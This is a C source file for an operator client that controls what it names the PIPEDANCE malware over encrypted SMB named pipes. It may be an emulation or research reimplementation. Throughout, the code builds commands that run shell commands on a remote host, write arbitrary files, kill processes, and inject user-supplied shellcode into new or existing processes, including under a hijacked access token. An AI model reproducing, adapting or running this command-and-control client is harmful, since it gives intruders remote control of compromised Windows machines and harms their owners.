#include "client.h"

#include <assert.h>
#include <stdio.h>

#include "communication.h"
#include "def.h"
#include "helpers.h"

handler_t handlers[MAX_N_HANDLERS] = { NULL };

const command_t COMMAND_LIST[] = {
    {STOP, "Stop client"},
    {TERMINATE_PROCESS, "Terminate process by pid"},
    {RUN_SHELL_COMMAND, "Run shell command and print output"},
    {LIST_WORKING_DIRECTORY_FILES, "List files in current working directory"},
    {WRITE_FILE, "Write file to disk"},
    {GET_WORKING_DIRECTORY, "Get current working directory"},
    {CHANGE_WORKING_DIRECTORY, "Change current working directory"},
    {LIST_RUNNING_PROCESSES, "List running processes"},
    {CREATE_RANDOM_PROCESS_IO_REDIRECT_INJECT_SHELLCODE_32BITS,
     "Perform injection (32bits) with stdin/stdout option for the child process"},
    {CREATE_RANDOM_PROCESS_IO_REDIRECT_INJECT_SHELLCODE_64BITS,
     "Perform injection (64bits) with stdin/stdout option for the child process"},
    {CREATE_RANDOM_PROCESS_WITH_HIJACKED_TOKEN_AND_INJECT_SHELLCODE_32BITS,
     "Create random process with hijacked token from provided PID and inject "
     "shellcode (32bits)"},
    {CREATE_RANDOM_PROCESS_WITH_HIJACKED_TOKEN_AND_INJECT_SHELLCODE_64BITS,
     "Create random process with hijacked token from provided PID and inject "
     "shellcode (64bits)"},
    {OPEN_PROCESS_AND_INJECT_SHELLCODE_32BITS,
     "Open process from provided PID and inject shellcode (32bits)"},
    {OPEN_PROCESS_AND_INJECT_SHELLCODE_64BITS,
     "Open process from provided PID and inject shellcode (64bits)"},
    {HTTP_CONNECTIVITY_CHECK, "HTTP connectivity check"},
    {DNS_CONNECTIVITY_CHECK_WITH_IP,
     "DNS connectivity check with provided DNS server IP"},
    {ICMP_CONNECTIVITY_CHECK, "ICMP connectivity check"},
    {TCP_CONNECTIVITY_CHECK, "TCP connectivity check"},
    {DNS_CONNECTIVITY_CHECK_WITHOUT_IP,
     "DNS connectivity check without DNS server"},
    {DISCONNECT, "Disconnect pipe / exit thread"},
    {TERMINATE_SERVER,
     "Terminate PIPEDANCE process / disconnect Pipe / exit thread"} };

void cl_change_working_directory(HANDLE pipe, const char* target,
    uint32_t pid)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    wchar_t directory[MAX_PATH_LENGTH] = { 0 };
    wchar_t* updated_working_directory = NULL;
    packet_t* packet = NULL;
    packet_t* result = NULL;

    h_get_wide_user_string(L"Enter new working directory: ", directory, MAX_PATH_LENGTH);

    comm_send_command(pipe, CHANGE_WORKING_DIRECTORY, (uint8_t*)directory,
        (uint32_t)((wcslen(directory) + 1) * sizeof(wchar_t)),
        RC4_KEY, RC4_KEY_LENGTH);

    packet = comm_receive_packet(pipe);
    if (!packet->_0.result)
    {
        printf("Change working directory command failed\n");
        cl_print_packet(packet);

        goto end;
    }

    updated_working_directory = (wchar_t*)comm_receive_decrypt_data(
        pipe, packet->_1.buffer_size, RC4_KEY, RC4_KEY_LENGTH);
    wprintf(L"New working directory: %.*ls\n", packet->_1.buffer_size / 2, updated_working_directory);

    result = comm_receive_packet(pipe);
    cl_print_packet(result);

end:
    if (packet)
        free(packet);
    if (result)
        free(result);
    if (updated_working_directory)
        free(updated_working_directory);
}

void cl_disconnect(HANDLE pipe, const char* target, uint32_t pid)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    packet_t* packet = NULL;

    comm_send_command(pipe, DISCONNECT, NULL, 0, RC4_KEY, RC4_KEY_LENGTH);

    packet = comm_receive_packet(pipe);
    cl_print_packet(packet);

    if (packet)
        free(packet);
}

void cl_dns_connectivity_check_with_ip(HANDLE pipe, const char* target,
    uint32_t pid)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    char dns_server_ip[IP_SIZE] = { 0 };
    packet_t* packet = NULL;

    h_get_user_string("Enter IP address for DNS server connectivity check: ", dns_server_ip, IP_SIZE);

    comm_send_command(pipe, DNS_CONNECTIVITY_CHECK_WITH_IP, dns_server_ip,
        (uint32_t)(strlen(dns_server_ip) + 1), RC4_KEY,
        RC4_KEY_LENGTH);

    packet = comm_receive_packet(pipe);
    cl_print_connectivity(packet);

    if (packet)
        free(packet);
}

void cl_dns_connectivity_check_without_ip(HANDLE pipe, const char* target,
    uint32_t pid)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    packet_t* packet = NULL;

    comm_send_command(pipe, DNS_CONNECTIVITY_CHECK_WITHOUT_IP, NULL, 0, RC4_KEY,
        RC4_KEY_LENGTH);

    packet = comm_receive_packet(pipe);
    cl_print_connectivity(packet);

    if (packet)
        free(packet);
}

size_t cl_get_command_list_length()
{
    return (sizeof COMMAND_LIST) / sizeof(command_t);
}

void cl_get_working_directory(HANDLE pipe, const char* target, uint32_t pid)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    packet_t* packet = NULL;
    packet_t* result = NULL;
    wchar_t* current_directory = NULL;

    comm_send_command(pipe, GET_WORKING_DIRECTORY, NULL, 0, RC4_KEY,
        RC4_KEY_LENGTH);

    packet = comm_receive_packet(pipe);
    if (!packet->_0.result)
    {
        printf("Get current directory command failed\n");
        cl_print_packet(packet);
        goto end;
    }

    current_directory = (wchar_t*)comm_receive_decrypt_data(
        pipe, packet->_1.buffer_size, RC4_KEY, RC4_KEY_LENGTH);
    wprintf(L"Current directory: %.*ls\n", packet->_1.buffer_size / 2, current_directory);

    result = comm_receive_packet(pipe);
    cl_print_packet(result);

end:
    if (packet)
        free(packet);
    if (current_directory)
        free(current_directory);
    if (result)
        free(result);
}

void cl_list_running_processes(HANDLE pipe, const char* target, uint32_t pid)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    HANDLE secondary_pipe = NULL;
    packet_t* packet = NULL;
    packet_t* result = NULL;
    wchar_t* running_processes = NULL;

    comm_send_command(pipe, LIST_RUNNING_PROCESSES, NULL, 0, RC4_KEY,
        RC4_KEY_LENGTH);

    secondary_pipe = cl_open_malware_pipe_0(target, pid);

    packet = comm_receive_packet(secondary_pipe);

    running_processes = (wchar_t*)comm_receive_decrypt_data(
        secondary_pipe, packet->_1.buffer_size, RC4_KEY, RC4_KEY_LENGTH);
    wprintf(L"%s\n", running_processes);

    result = comm_receive_packet(pipe);
    cl_print_packet(result);

    if (packet)
        free(packet);
    if (result)
        free(result);
    if (running_processes)
        free(running_processes);
    if (INVALID_HANDLE_VALUE != secondary_pipe)
        CloseHandle(secondary_pipe);
}

void cl_http_connectivity_check(HANDLE pipe, const char* target, uint32_t pid)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    wchar_t domain[MAX_SIZE / 2] = { 0 };
    packet_t* packet = NULL;

    h_get_wide_user_string(L"Enter domain for HTTP GET Request connectivity check: ", domain, MAX_SIZE / 2);

    comm_send_command(pipe, HTTP_CONNECTIVITY_CHECK, (uint8_t*)domain,
        (uint32_t)((wcslen(domain) + 1) * 2), RC4_KEY,
        RC4_KEY_LENGTH);

    packet = comm_receive_packet(pipe);
    cl_print_connectivity(packet);

    if (packet)
        free(packet);
}

void cl_icmp_connectivity_check(HANDLE pipe, const char* target, uint32_t pid)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    char ip[IP_SIZE] = { 0 };
    packet_t* packet = NULL;

    h_get_user_string("Enter IP address for ICMP request connectivity check: ", ip, IP_SIZE);

    comm_send_command(pipe, ICMP_CONNECTIVITY_CHECK, ip,
        (uint32_t)(strlen(ip) + 1), RC4_KEY, RC4_KEY_LENGTH);

    packet = comm_receive_packet(pipe);
    cl_print_connectivity(packet);

    if (packet)
        free(packet);
}

void cl_initialize_handlers(void)
{
    handlers[TERMINATE_PROCESS] = cl_terminate_process;

    handlers[RUN_SHELL_COMMAND] = cl_run_shell_command;

    handlers[LIST_WORKING_DIRECTORY_FILES] = cl_list_working_directory_files;

    handlers[WRITE_FILE] = cl_write_file;

    handlers[GET_WORKING_DIRECTORY] = cl_get_working_directory;

    handlers[CHANGE_WORKING_DIRECTORY] = cl_change_working_directory;

    handlers[LIST_RUNNING_PROCESSES] = cl_list_running_processes;

    handlers[CREATE_RANDOM_PROCESS_IO_REDIRECT_INJECT_SHELLCODE_32BITS] =

        cl_create_random_process_io_redirect_inject_shellcode_32;

    handlers[CREATE_RANDOM_PROCESS_IO_REDIRECT_INJECT_SHELLCODE_64BITS] =

        cl_create_random_process_io_redirect_inject_shellcode_64;

    handlers

        [CREATE_RANDOM_PROCESS_WITH_HIJACKED_TOKEN_AND_INJECT_SHELLCODE_32BITS] =

        cl_create_random_process_inject_shellcode_32;

    handlers

        [CREATE_RANDOM_PROCESS_WITH_HIJACKED_TOKEN_AND_INJECT_SHELLCODE_64BITS] =

        cl_create_random_process_inject_shellcode_64;

    handlers[OPEN_PROCESS_AND_INJECT_SHELLCODE_32BITS] =

        cl_open_process_inject_shellcode_32;

    handlers[OPEN_PROCESS_AND_INJECT_SHELLCODE_64BITS] =

        cl_open_process_inject_shellcode_64;

    handlers[HTTP_CONNECTIVITY_CHECK] = cl_http_connectivity_check;

    handlers[DNS_CONNECTIVITY_CHECK_WITH_IP] = cl_dns_connectivity_check_with_ip;

    handlers[ICMP_CONNECTIVITY_CHECK] = cl_icmp_connectivity_check;

    handlers[TCP_CONNECTIVITY_CHECK] = cl_tcp_connectivity_check;

    handlers[DNS_CONNECTIVITY_CHECK_WITHOUT_IP] =

        cl_dns_connectivity_check_without_ip;

    handlers[DISCONNECT] = cl_disconnect;

    handlers[TERMINATE_SERVER] = cl_terminate_server;
}

cl_inject_io_redirect(bool is_64, HANDLE pipe, const char* target, uint32_t pid)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    uint32_t enable_process_redirect = 0;
    uint32_t has_process_arguments = false;
    uint32_t process_arguments_size = 0;
    uint32_t total_size = 0;

    char filepath_arg[MAX_SIZE] = { 0 };
    wchar_t process_arguments[MAX_SIZE / 2] = { 0 };
    char process_initial_input[MAX_SIZE] = { 0 };

    uint8_t* binary_shellcode = NULL;
    size_t binary_shellcode_size = 0;
    shellcode_io_redirection_t* shellcode = NULL;
    HANDLE secondary_pipe = INVALID_HANDLE_VALUE;

    packet_t* packet = NULL;
    packet_t* result = NULL;

    uint8_t* output = NULL;

    h_get_user_string("Enter filepath containing shellcode: ", filepath_arg, MAX_SIZE);
    binary_shellcode = h_read_file(filepath_arg, &binary_shellcode_size);

    h_get_user_dword("Enable process output redirect? 0 (No) | 1 (Yes): ",
        &enable_process_redirect);

    h_get_user_dword("Is there any process arguments? 0 (No) | 1 (Yes): ",
        &has_process_arguments);

    if (has_process_arguments)
    {
        h_get_wide_user_string(L"\nEnter arguments: ", process_arguments, MAX_SIZE / 2);
        process_arguments_size = (wcslen(process_arguments) + 1) * sizeof(wchar_t);
    }

    total_size = sizeof(shellcode_io_redirection_t) + binary_shellcode_size +
        process_arguments_size;

    shellcode = (shellcode_io_redirection_t*)calloc(1, total_size);
    if (!shellcode)
        h_error("Failed to allocate shellcode\n");

    shellcode->enable_output_redirection = 0 != enable_process_redirect;
    shellcode->has_process_arguments = 0 != has_process_arguments;
    shellcode->shellcode_size = binary_shellcode_size;
    shellcode->process_arguments_size = process_arguments_size;

    memcpy_s(shellcode->buffer, total_size, binary_shellcode,
        binary_shellcode_size);

    memcpy_s(&shellcode->buffer[binary_shellcode_size],
        total_size - binary_shellcode_size, &process_arguments,
        process_arguments_size);

    shellcode->buffer[binary_shellcode_size + process_arguments_size - 1] = '\x00';

    comm_send_command(pipe,
        is_64
        ? CREATE_RANDOM_PROCESS_IO_REDIRECT_INJECT_SHELLCODE_64BITS
        : CREATE_RANDOM_PROCESS_IO_REDIRECT_INJECT_SHELLCODE_32BITS,
        (uint8_t*)shellcode, total_size, RC4_KEY, RC4_KEY_LENGTH);

    if (enable_process_redirect)
    {
        secondary_pipe = cl_open_malware_pipe_0(target, pid);
        packet = comm_receive_packet(secondary_pipe);
        output = comm_receive_decrypt_data(secondary_pipe, packet->_1.buffer_size,
            RC4_KEY, RC4_KEY_LENGTH);

        for (uint32_t i = 0; i < packet->_1.buffer_size; i++)
        {
            if (output[i] != '\0')
            {
                printf("%c", output[i]);
            }
        }
    }

    result = comm_receive_packet(pipe);
    cl_print_packet(result);

    if (binary_shellcode)
        free(binary_shellcode);
    if (shellcode)
        free(shellcode);
    if (packet)
        free(packet);
    if (result)
        free(result);
    if (output)
        free(output);
    if (INVALID_HANDLE_VALUE != secondary_pipe)
        CloseHandle(secondary_pipe);
}

void cl_inject_process(bool open_process, bool is_64, HANDLE pipe)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    char hexlified_shellcode[MAX_SIZE] = { 0 };
    packet_t* packet = NULL;
    shellcode_t* shellcode = NULL;
    uint8_t* binary_shellcode = NULL;
    uint32_t target_pid = 0;
    size_t shellcode_size = 0;

    printf("Enter in existing PID: ");
    while (!scanf_s("%d", &target_pid) || !target_pid)
        printf("Please enter a valid PID\n");

    h_get_user_string("Enter in shellcode: ", hexlified_shellcode, MAX_SIZE);

    binary_shellcode =
        h_bytes_from_hexlified(hexlified_shellcode, &shellcode_size);

    shellcode = (shellcode_t*)calloc(1, sizeof(shellcode_t) + shellcode_size);
    if (!shellcode)
        h_error("Failed to allocate shellcode memory\n");

    shellcode->pid = target_pid;

    memcpy_s(shellcode->buffer, shellcode_size, binary_shellcode, shellcode_size);

    comm_send_command(
        pipe,
        open_process
        ? (is_64
            ? OPEN_PROCESS_AND_INJECT_SHELLCODE_64BITS
            : OPEN_PROCESS_AND_INJECT_SHELLCODE_32BITS)
        : (is_64
            ? CREATE_RANDOM_PROCESS_WITH_HIJACKED_TOKEN_AND_INJECT_SHELLCODE_64BITS
            : CREATE_RANDOM_PROCESS_WITH_HIJACKED_TOKEN_AND_INJECT_SHELLCODE_32BITS),
        (uint8_t*)shellcode, (uint32_t)(sizeof(shellcode_t) + shellcode_size),
        RC4_KEY, RC4_KEY_LENGTH);

    packet = comm_receive_packet(pipe);
    cl_print_packet(packet);

    if (packet)
        free(packet);
    if (shellcode)
        free(shellcode);
    if (binary_shellcode)
        free(binary_shellcode);
}

void cl_create_random_process_io_redirect_inject_shellcode_32(HANDLE pipe,
    const char* target,
    uint32_t pid)
{

    cl_inject_io_redirect(false, pipe, target, pid);
}

void cl_create_random_process_io_redirect_inject_shellcode_64(HANDLE pipe,
    const char* target,
    uint32_t pid)
{

    cl_inject_io_redirect(true, pipe, target, pid);
}

void cl_create_random_process_inject_shellcode_32(HANDLE pipe,
    const char* target,
    uint32_t pid)
{
    cl_inject_process(false, false, pipe);
}

void cl_create_random_process_inject_shellcode_64(HANDLE pipe,
    const char* target,
    uint32_t pid)
{
    cl_inject_process(false, true, pipe);
}

void cl_open_process_inject_shellcode_32(HANDLE pipe, const char* target,
    uint32_t pid)
{
    cl_inject_process(true, false, pipe);
}

void cl_open_process_inject_shellcode_64(HANDLE pipe, const char* target,
    uint32_t pid)
{
    cl_inject_process(true, true, pipe);
}

void cl_list_working_directory_files(HANDLE pipe, const char* target,
    uint32_t pid)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    HANDLE secondary_pipe = INVALID_HANDLE_VALUE;
    packet_t* packet = NULL;
    packet_t* result = NULL;
    wchar_t* file_list = NULL;

    comm_send_command(pipe, LIST_WORKING_DIRECTORY_FILES, NULL, 0, RC4_KEY,
        RC4_KEY_LENGTH);

    secondary_pipe = cl_open_malware_pipe_0(target, pid);

    packet = comm_receive_packet(secondary_pipe);

    file_list = (wchar_t*)comm_receive_decrypt_data(
        secondary_pipe, packet->_1.buffer_size, RC4_KEY, RC4_KEY_LENGTH);

    wprintf(L"%s\n", file_list);

    result = comm_receive_packet(pipe);
    cl_print_packet(result);

    if (packet)
        free(packet);
    if (result)
        free(result);
    if (file_list)
        free(file_list);
    if (INVALID_HANDLE_VALUE != secondary_pipe)
        CloseHandle(secondary_pipe);
}

char* cl_format_malware_pipe_0(const char* target, uint32_t malware_pid)
{
    assert(target);
    assert(malware_pid);

    char* pipe_path = NULL;

    pipe_path = (char*)calloc(1, MAX_PATH_LENGTH);
    if (!pipe_path)
        h_error("Failed to allocate pipe path\n");

    sprintf_s(pipe_path, MAX_PATH_LENGTH, "\\\\%s\\pipe\\%s.%d", target, RC4_KEY,
        malware_pid);

    return pipe_path;
}

char* cl_format_malware_pipe_1(const char* target)
{
    assert(target);

    char* pipe_path = NULL;

    pipe_path = (char*)calloc(1, MAX_PATH_LENGTH);
    if (!pipe_path)
        h_error("Failed to allocate pipe path\n");

    sprintf_s(pipe_path, MAX_PATH_LENGTH, "\\\\%s\\pipe\\%s", target, RC4_KEY);

    return pipe_path;
}

HANDLE cl_open_malware_pipe_aux(const char* path)
{
    assert(path);
    HANDLE pipe = INVALID_HANDLE_VALUE;

    for (size_t tries = 0; tries < MAX_TRIES; tries++)
    {
        pipe = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 3, 0, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, NULL);

        if (INVALID_HANDLE_VALUE != pipe)
            return pipe;

        Sleep(SLEEP_TIME);
    }

    h_error("Failed to open pipe %s\n", path);
}

HANDLE cl_open_malware_pipe_0(const char* target, uint32_t malware_pid)
{
    return cl_open_malware_pipe_aux(
        cl_format_malware_pipe_0(target, malware_pid));
}

HANDLE cl_open_malware_pipe_1(const char* target)
{
    return cl_open_malware_pipe_aux(cl_format_malware_pipe_1(target));
}

void cl_print_connectivity(const packet_t* packet)
{
    assert(packet);

    if (packet->_0.result != 1)
    {
        printf("\n\n\tConnectivity Check Status: NOT Successful\n");

        if (packet->_1.error_code != 0)
            printf("\n\n\tError Code: %d\n", packet->_1.error_code);
        return;
    }

    printf("\n\n\tConnectivity Check Status: Successful\n");
}

void cl_print_packet(const packet_t* packet)
{
    printf("\n\tResult: %d. Error code: %d\n", packet->_0.result,
        packet->_1.error_code);
}

void cl_process_command(HANDLE pipe, const char* target, uint32_t pid,
    uint32_t command)
{
    assert(pipe);

    if (!handlers[command])
    {
        printf("Command %d doesn't exist\n", pid);
        return;
    }

    handlers[command](pipe, target, pid);
}

void cl_terminate_process(HANDLE pipe, const char* target, uint32_t pid)
{
    printf("Enter in pid for termination: ");

    uint32_t target_pid = 0;
    packet_t* packet = NULL;

    while (!scanf_s("%d", &target_pid) || !target_pid)
        printf("Please enter a valid pid\n");

    comm_send_command(pipe, TERMINATE_PROCESS, (uint8_t*)&target_pid,
        sizeof(uint32_t), RC4_KEY, RC4_KEY_LENGTH);

    packet = comm_receive_packet(pipe);
    cl_print_packet(packet);

    free(packet);
}

void cl_run_shell_command(HANDLE pipe, const char* target, uint32_t pid)
{
    assert(INVALID_HANDLE_VALUE != pipe);
    assert(target);
    assert(pid);

    wchar_t shell_command[MAX_SIZE / 2] = { 0 };
    HANDLE secondary_pipe = INVALID_HANDLE_VALUE;
    packet_t* packet = NULL;
    packet_t* result = NULL;
    wchar_t* output = NULL;

    h_get_wide_user_string(L"Enter shell command to execute: ", shell_command, MAX_SIZE / 2);

    comm_send_command(pipe, RUN_SHELL_COMMAND, (uint8_t*)shell_command,
        (uint32_t)((wcslen(shell_command) + 1) * sizeof(wchar_t)), RC4_KEY,
        RC4_KEY_LENGTH);

    secondary_pipe = cl_open_malware_pipe_0(target, pid);

    packet = comm_receive_packet(secondary_pipe);

    output = (wchar_t*)comm_receive_decrypt_data(
        secondary_pipe, packet->_1.buffer_size, RC4_KEY, RC4_KEY_LENGTH);

    wprintf(L"%.*ls\n", packet->_1.buffer_size / 2, output);

    result = comm_receive_packet(pipe);
    cl_print_packet(result);

    if (packet)
        free(packet);
    if (result)
        free(result);
    if (output)
        free(output);
    if (INVALID_HANDLE_VALUE != secondary_pipe)
        CloseHandle(secondary_pipe);
}

void cl_tcp_connectivity_check(HANDLE pipe, const char* target, uint32_t pid)
{
    char ip[IP_SIZE] = { 0 };
    char port_string[PORT_SIZE] = { 0 };
    network_info_t net = { 0 };
    packet_t* packet = NULL;

    h_get_user_string("Enter in IP for TCP Socket connectivity check: ", ip, IP_SIZE);
    h_get_user_string("Enter in IP for TCP Socket connectivity check: ", port_string, PORT_SIZE);

    net.port = (uint16_t)atoi(port_string);
    strcpy_s(net.ip, IP_SIZE, ip);

    comm_send_command(pipe, TCP_CONNECTIVITY_CHECK, (uint8_t*)&net,
        sizeof(network_info_t), RC4_KEY, RC4_KEY_LENGTH);

    packet = comm_receive_packet(pipe);
    cl_print_connectivity(packet);

    free(packet);
}

void cl_terminate_server(HANDLE pipe, const char* target, uint32_t pid)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    packet_t* packet = NULL;

    comm_send_command(pipe, TERMINATE_SERVER, NULL, 0, RC4_KEY, RC4_KEY_LENGTH);

    packet = comm_receive_packet(pipe);
    cl_print_packet(packet);

    if (packet)
        free(packet);
}

void cl_write_file(HANDLE pipe, const char* target, uint32_t pid)
{
    wchar_t file_content[MAX_SIZE / 2] = { 0 };
    wchar_t file_path[MAX_PATH_LENGTH / 2] = { 0 };
    HANDLE secondary_pipe = INVALID_HANDLE_VALUE;
    packet_t* packet = NULL;

    h_get_wide_user_string(L"Enter filename with fullpath of where to write file (ex. C:\\tmp\\text): ", file_path, MAX_PATH_LENGTH / 2);
    h_get_wide_user_string(L"Enter file content: ", file_content, MAX_SIZE / 2);

    comm_send_command(pipe, WRITE_FILE, (uint8_t*)file_path,
        (uint32_t)((wcslen(file_path) + 1) * sizeof(wchar_t)),
        RC4_KEY, RC4_KEY_LENGTH);

    packet = comm_receive_packet(pipe);
    if (!packet->_0.result)
    {
        printf("Write file command failed\n");
        cl_print_packet(packet);
        goto end;
    }

    secondary_pipe = cl_open_malware_pipe_0(target, pid);
    comm_send_file_write(
        secondary_pipe, (uint8_t*)file_content,
        (uint32_t)((wcslen(file_content) + 1) * sizeof(wchar_t)));

end:
    if (packet)
        free(packet);
    if (INVALID_HANDLE_VALUE != secondary_pipe)
        CloseHandle(secondary_pipe);
}
